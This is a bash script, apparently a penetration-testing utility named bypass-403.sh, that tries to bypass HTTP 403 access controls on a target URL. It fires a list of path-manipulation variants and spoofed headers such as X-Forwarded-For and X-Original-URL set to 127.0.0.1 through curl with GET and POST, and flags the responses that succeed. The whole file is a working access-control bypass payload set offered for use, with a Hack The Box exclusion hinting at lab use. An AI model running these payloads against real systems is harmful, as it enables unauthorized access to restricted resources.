#!/bin/bash
# Refactored and payloads added by Nicholas Ferreira (github.com/Nickguitar)
    
# Definir colores
GREEN_BOLD='\033[1;92m'
GRAY='\033[90m'
NC='\033[0m' # No Color

echo "./bypass-403.sh https://example.com path"
echo " "

read -r -d '' paths <<EOF
$1/$2
$1/%2e/$2
$1/$2/.
$1//$2//
$1/./$2/./
$1/$2%20
$1/$2%09
$1/$2?
$1/$2.html
$1/$2/?anything
$1/$2#
$1/$2/*
$1/$2.php
$1/$2.json
"$1/$2..;/"
" $1/$2;/"
-X TRACE $1/$2
-H "Base-Url: 127.0.0.1" $1/$2
-H "Client-IP: 127.0.0.1" $1/$2
-H "Content-Length:0" -X POST $1/$2
-H "Http-Url: 127.0.0.1" $1/$2
-H "Proxy-Host: 127.0.0.1" $1/$2
-H "Proxy-Url: 127.0.0.1" $1/$2
-H "Real-Ip: 127.0.0.1" $1/$2
-H "Redirect: 127.0.0.1" $1/$2
-H "Referer: 127.0.0.1" $1/$2
-H "Referrer: 127.0.0.1" $1/$2
-H "Request-Uri: 127.0.0.1" $1/$2
-H "Uri: 127.0.0.1" $1/$2
-H "Url: 127.0.0.1" $1/$2
-H "X-Client-IP: 127.0.0.1" $1/$2
-H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
-H "X-Forward-For: 127.0.0.1" $1/$2
-H "X-Forwarded-By: 127.0.0.1" $1/$2
-H "X-Forwarded-For-Original: 127.0.0.1" $1/$2
-H "X-Forwarded-For: 127.0.0.1" $1/$2
-H "X-Forwarded-For: 127.0.0.1:80" $1/$2
-H "X-Forwarded-For: http://127.0.0.1" $1/$2
-H "X-Forwarded-Host: 127.0.0.1" $1/$2
-H "X-Forwarded-Port: 443" $1/$2
-H "X-Forwarded-Port: 4443" $1/$2
-H "X-Forwarded-Port: 80" $1/$2
-H "X-Forwarded-Port: 8080" $1/$2
-H "X-Forwarded-Port: 8443" $1/$2
-H "X-Forwarded-Scheme: http" $1/$2
-H "X-Forwarded-Scheme: https" $1/$2
-H "X-Forwarded-Server: 127.0.0.1" $1/$2
-H "X-Forwarded: 127.0.0.1" $1/$2
-H "X-Forwarder-For: 127.0.0.1" $1/$2
-H "X-Host: 127.0.0.1" $1/$2
-H "X-Http-Destinationurl: 127.0.0.1" $1/$2
-H "X-Http-Host-Override: 127.0.0.1" $1/$2
-H "X-Original-Remote-Addr: 127.0.0.1" $1/$2
-H "X-Original-URL: $2" $1/$2
-H "X-Original-Url: 127.0.0.1" $1/$2
-H "X-Originating-IP: 127.0.0.1" $1/$2
-H "X-Proxy-Url: 127.0.0.1" $1/$2
-H "X-Real-Ip: 127.0.0.1" $1/$2
-H "X-Remote-Addr: 127.0.0.1" $1/$2
-H "X-Remote-IP: 127.0.0.1" $1/$2
-H "X-Rewrite-Url: 127.0.0.1" $1/$2
-H "X-True-IP: 127.0.0.1" $1/$2
-H "X-rewrite-url: $2" $1/$2
EOF

IFS=$'\n'
for method in GET POST; do
  for payload in ${paths[@]}; do
      cmd="curl -X $method -Lks -o /dev/null -iL -w \"%{http_code}\",\"%{size_download}\" $payload"
      result=$(eval $cmd)
      http_code=$(echo $result | cut -d ',' -f1)
      

      
      if [[ $http_code =~ ^[23][0-9]{2}$ ]]; then
          # Código 2xx o 3xx - verde brillante y negrita
          echo -e "${GREEN_BOLD}${result} $method ${payload}${NC}"
      else
          # Otros códigos - gris
          echo -e "${GRAY}${result} $method ${payload}${NC}"
      fi
  done
done
if ! [[ $1 =~ .htb ]]; then
  echo
  echo "Way back machine:"
  curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
fi